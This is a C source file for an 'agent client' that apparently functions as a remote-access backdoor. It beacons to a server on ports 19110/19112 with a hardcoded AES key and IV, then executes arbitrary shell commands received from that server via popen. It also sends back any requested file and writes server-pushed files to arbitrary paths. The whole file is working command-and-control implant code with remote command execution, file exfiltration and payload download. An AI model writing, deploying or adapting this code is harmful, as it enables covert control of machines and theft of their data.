#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>
#include <sys/wait.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sys/stat.h>

#define BUFFER_SIZE 4096
#define CONNECT_RETRY_INTERVAL 5
#define MY_AES_KEY "0123456789abcdef0123456789abcdef"
#define AES_IV  "0123456789abcdef"
#define FILE_START_MARKER "file_start:"
#define FILE_END_MARKER "file_end"
//#define FILE_START_MARKER "\x1A\x1Bfile_start:"
//#define FILE_END_MARKER "\x1A\x1Bfile_end"

#ifndef LOG_INFO
#define LOG_INFO printf
#endif
#ifndef LOG_ERROR
#define LOG_ERROR printf
#endif

static int encrypt_data(unsigned char *plaintext, int plaintext_len, unsigned char *ciphertext)
{
    AES_KEY key;
    int ret;

    ret = AES_set_encrypt_key((unsigned char *)MY_AES_KEY, 256, &key);
    if (ret < 0) {
        fprintf(stderr, "AES_set_encrypt_key failed\n");
        return -1;
    }

    unsigned char iv[AES_BLOCK_SIZE];
    memcpy(iv, AES_IV, AES_BLOCK_SIZE);

    int padded_len = ((plaintext_len + AES_BLOCK_SIZE - 1) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
    unsigned char *padded_text = (unsigned char *)calloc(padded_len, 1);
    if (padded_text == NULL) {
        perror("Memory allocation failed in encrypt_data");
        return -1;
    }

    memcpy(padded_text, plaintext, plaintext_len);
    int i;
    for (i = plaintext_len; i < padded_len; i++) {
        padded_text[i] = (unsigned char)(padded_len - plaintext_len);
    }

    AES_cbc_encrypt(padded_text, ciphertext, padded_len, &key, iv, AES_ENCRYPT);
    free(padded_text);
    return padded_len;
}

static int decrypt_data(unsigned char *ciphertext, int ciphertext_len, unsigned char *plaintext)
{
    AES_KEY key;
    int ret;

    ret = AES_set_decrypt_key((unsigned char *)MY_AES_KEY, 256, &key);
    if (ret < 0) {
        fprintf(stderr, "AES_set_decrypt_key failed\n");
        LOG_INFO("AES_set_decrypt_key failed\n");
        return -1;
    }

    unsigned char iv[AES_BLOCK_SIZE];
    memcpy(iv, AES_IV, AES_BLOCK_SIZE);

    AES_cbc_encrypt(ciphertext, plaintext, ciphertext_len, &key, iv, AES_DECRYPT);
    int padding = plaintext[ciphertext_len - 1];
    if (padding < 1 || padding > AES_BLOCK_SIZE) {
        fprintf(stderr, "Invalid padding value: %d\n", padding);
        LOG_INFO("Invalid padding value: %d\n", padding);
        return -1;
    }
    return ciphertext_len - padding;
}

static void run_client(const char *server_ip, const char *dev_uid)
{
    int sock = -1;
    struct sockaddr_in server_addr;
    unsigned char encrypted_buffer[BUFFER_SIZE];
    unsigned char decrypted_buffer[BUFFER_SIZE];
    int ports[] = {19110, 19112};
    int num_ports = 2;
    int port_index;

    while (1) {
        int authenticated = 0;

        for (port_index = 0; port_index < num_ports && !authenticated; port_index++) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock == -1) {
                perror("Socket failed");
                sleep(CONNECT_RETRY_INTERVAL);
                break;
            }

            struct timeval tv;
            tv.tv_sec = 5;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));

            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons((unsigned short)ports[port_index]);
            if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
                perror("Invalid address");
                close(sock);
                sleep(CONNECT_RETRY_INTERVAL);
                break;
            }

            LOG_INFO("Trying to connect to server %s:%d (PID: %d)...\n", server_ip, ports[port_index], getpid());
            if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
                perror("Connect failed");
                close(sock);
                continue;
            }

            char uid_msg[BUFFER_SIZE];
            snprintf(uid_msg, sizeof(uid_msg), "I am agent client, my uid is %s", dev_uid);
            int encrypted_len = encrypt_data((unsigned char *)uid_msg, strlen(uid_msg), encrypted_buffer);
            if (encrypted_len < 0 || send(sock, encrypted_buffer, encrypted_len, 0) == -1) {
                perror("Send UID failed");
                close(sock);
                continue;
            }
            LOG_INFO("Sent UID: %s\n", uid_msg);

            int bytes_received = recv(sock, encrypted_buffer, BUFFER_SIZE, 0);
            if (bytes_received == -1 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                LOG_INFO("Receive server response timeout, trying next port\n");
                close(sock);
                continue;
            } else if (bytes_received <= 0) {
                LOG_INFO("No server response received, possibly another service, trying next port\n");
                close(sock);
                continue;
            }

            int decrypted_len = decrypt_data(encrypted_buffer, bytes_received, decrypted_buffer);
            if (decrypted_len < 0) {
                LOG_INFO("Failed to decrypt server response, trying next port\n");
                close(sock);
                continue;
            }
            decrypted_buffer[decrypted_len] = '\0';

            char expected_response[BUFFER_SIZE];
            snprintf(expected_response, sizeof(expected_response), "hello, %s", dev_uid);
            if (strcmp((char *)decrypted_buffer, expected_response) != 0) {
                LOG_INFO("Server response mismatch, received: %s, expected: %s, trying next port\n",
                       (char *)decrypted_buffer, expected_response);
                close(sock);
                continue;
            }

            LOG_INFO("Authentication successful, received: %s, entering command processing mode\n", expected_response);
            authenticated = 1;
        }

        if (!authenticated) {
            LOG_INFO("All ports (19110, 19112) failed to connect or authenticate, retrying in %d seconds...\n", CONNECT_RETRY_INTERVAL);
            sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }

        while (1) {
            fd_set readfds;
            struct timeval tv;
            tv.tv_sec = 5;
            tv.tv_usec = 0;
            FD_ZERO(&readfds);
            FD_SET(sock, &readfds);

            int ret = select(sock + 1, &readfds, NULL, NULL, &tv);
            if (ret == -1) {
                perror("Select failed");
                break;
            } else if (ret == 0) {
                char heartbeat[] = "heartbeat";
                int encrypted_len = encrypt_data((unsigned char *)heartbeat, strlen(heartbeat), encrypted_buffer);
                if (send(sock, encrypted_buffer, encrypted_len, 0) == -1) {
                    perror("Send heartbeat failed");
                    break;
                }
                LOG_INFO("Sent heartbeat message\n");
                continue;
            }

            int bytes_received = recv(sock, encrypted_buffer, BUFFER_SIZE, 0);
            if (bytes_received <= 0) {
                LOG_ERROR("Server disconnected or receive error: %s\n", strerror(errno));
                break;
            }

            int decrypted_len = decrypt_data(encrypted_buffer, bytes_received, decrypted_buffer);
            if (decrypted_len < 0) {
                // Assume it's unencrypted file_start, file_end, or file data
                memcpy(decrypted_buffer, encrypted_buffer, bytes_received);
                decrypted_len = bytes_received;
            }
            decrypted_buffer[decrypted_len] = '\0';
            LOG_INFO("Received command: %s\n", (char *)decrypted_buffer);

            char result[BUFFER_SIZE] = {0};
            int offset = 0;
            char received_uid[33];
            char command[BUFFER_SIZE];
            long file_size;
            char file_path[BUFFER_SIZE];

            if (sscanf((char *)decrypted_buffer, "uid:%32s %[^\n]", received_uid, command) == 2) {
                if (strcmp(received_uid, dev_uid) == 0) {
                    LOG_INFO("UID matched, processing command: %s\n", command);

                    if (strcmp(command, "exit") == 0) {
                        LOG_INFO("Received exit command, reconnecting\n");
                        break;
                    }

                    if (sscanf(command, "get_file %s %s", file_path, result) == 2) {
                        struct stat st;
                        if (stat(file_path, &st) == -1 || !S_ISREG(st.st_mode)) {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "Source path %s must be a file\n", file_path);
                        } else {
                            int fd = open(file_path, O_RDONLY);
                            if (fd == -1) {
                                offset += snprintf(result + offset, sizeof(result) - offset,
                                                   "Cannot open file %s: %s\n", file_path, strerror(errno));
                            } else {
                                off_t file_size = st.st_size;
                                char file_start[BUFFER_SIZE];
                                snprintf(file_start, sizeof(file_start), FILE_START_MARKER "%ld:%s", (long)file_size, result);
                                if (send(sock, file_start, strlen(file_start), 0) == -1) {
                                    perror("Send file_start failed");
                                    close(fd);
                                    break;
                                }
                                char file_buffer[BUFFER_SIZE];
                                ssize_t bytes_read;
                                size_t total_sent = 0;
                                while (total_sent < file_size && (bytes_read = read(fd, file_buffer, BUFFER_SIZE)) > 0) {
                                    if (send(sock, file_buffer, bytes_read, 0) == -1) {
                                        perror("Send file data failed");
                                        close(fd);
                                        break;
                                    }
                                    total_sent += bytes_read;
                                }
                                close(fd);
                                if (total_sent == file_size) {
                                    LOG_INFO("[DEBUG] Sending " FILE_END_MARKER "\n");
                                    if (send(sock, FILE_END_MARKER, strlen(FILE_END_MARKER), 0) == -1) {
                                        perror("Send file_end failed");
                                        break;
                                    }
                                    offset += snprintf(result + offset, sizeof(result) - offset,
                                                       "Sent file %s, size %ld bytes\n", file_path, file_size);
                                } else {
                                    offset += snprintf(result + offset, sizeof(result) - offset,
                                                       "Failed to send file %s completely, sent %zu of %ld bytes\n", file_path, total_sent, file_size);
                                }
                            }
                        }
                    } else {
                        FILE *fp = popen(command, "r");
                        if (fp == NULL) {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "Command '%s' execution failed: %s\n", command, strerror(errno));
                        } else {
                            size_t total_len = fread(result, 1, BUFFER_SIZE - 1, fp);
                            result[total_len] = '\0';
                            if (total_len == BUFFER_SIZE - 1) {
                                LOG_INFO("Command '%s' output exceeds %d bytes, truncated\n", command, BUFFER_SIZE - 1);
                            }
                            pclose(fp);
                        }
                    }
                } else {
                    offset += snprintf(result + offset, sizeof(result) - offset,
                                       "UID mismatch: received %s, expected %s\n", received_uid, dev_uid);
                }
            } else if (sscanf((char *)decrypted_buffer, FILE_START_MARKER "%ld:%s", &file_size, file_path) == 2) {
                char *dir = strdup(file_path);
                char *slash = strrchr(dir, '/');
                if (slash) {
                    *slash = '\0';
                    if (mkdir(dir, 0755) == -1 && errno != EEXIST) {
                        offset += snprintf(result + offset, sizeof(result) - offset,
                                           "Cannot create directory %s: %s\n", dir, strerror(errno));
                    }
                }
                free(dir);

                int fd = open(file_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (fd == -1) {
                    offset += snprintf(result + offset, sizeof(result) - offset,
                                       "Cannot create file %s: %s\n", file_path, strerror(errno));
                } else {
                    size_t received = 0;
                    while (received < file_size) {
                        size_t remaining = file_size - received;
                        size_t to_receive = (remaining < BUFFER_SIZE) ? remaining : BUFFER_SIZE;
                        bytes_received = recv(sock, decrypted_buffer, to_receive, 0);
                        if (bytes_received <= 0) {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "Failed to receive file data: %s\n", strerror(errno));
                            break;
                        }
                        write(fd, decrypted_buffer, bytes_received);
                        received += bytes_received;
                    }
                    close(fd);
                    if (received == file_size) {
                        bytes_received = recv(sock, decrypted_buffer, strlen(FILE_END_MARKER), 0);
                        LOG_INFO("[DEBUG] Received %d bytes for file_end: %.*s\n", bytes_received, bytes_received, (char *)decrypted_buffer);
                        if (bytes_received == strlen(FILE_END_MARKER) && strncmp((char *)decrypted_buffer, FILE_END_MARKER, strlen(FILE_END_MARKER)) == 0) {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "File saved to %s, size %ld bytes\n", file_path, file_size);
                        } else {
                            offset += snprintf(result + offset, sizeof(result) - offset,
                                               "Expected " FILE_END_MARKER ", received %d bytes: %.*s\n", bytes_received, bytes_received, (char *)decrypted_buffer);
                        }
                    } else {
                        offset += snprintf(result + offset, sizeof(result) - offset,
                                           "File %s received incompletely, expected %ld bytes, got %zu bytes\n", file_path, file_size, received);
                    }
                }
            } else {
                offset += snprintf(result + offset, sizeof(result) - offset,
                                   "Command format error: %s\n", (char *)decrypted_buffer);
            }

            int encrypted_len = encrypt_data((unsigned char *)result, strlen(result), encrypted_buffer);
            if (encrypted_len < 0 || send(sock, encrypted_buffer, encrypted_len, 0) == -1) {
                perror("Send result failed");
                break;
            }
        }

        close(sock);
        sock = -1;
    }
}

int main(int argc, char *argv[])
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <server_ip> <uid>\n", argv[0]);
        return 1;
    }
    run_client(argv[1], argv[2]);
    return 0;
}
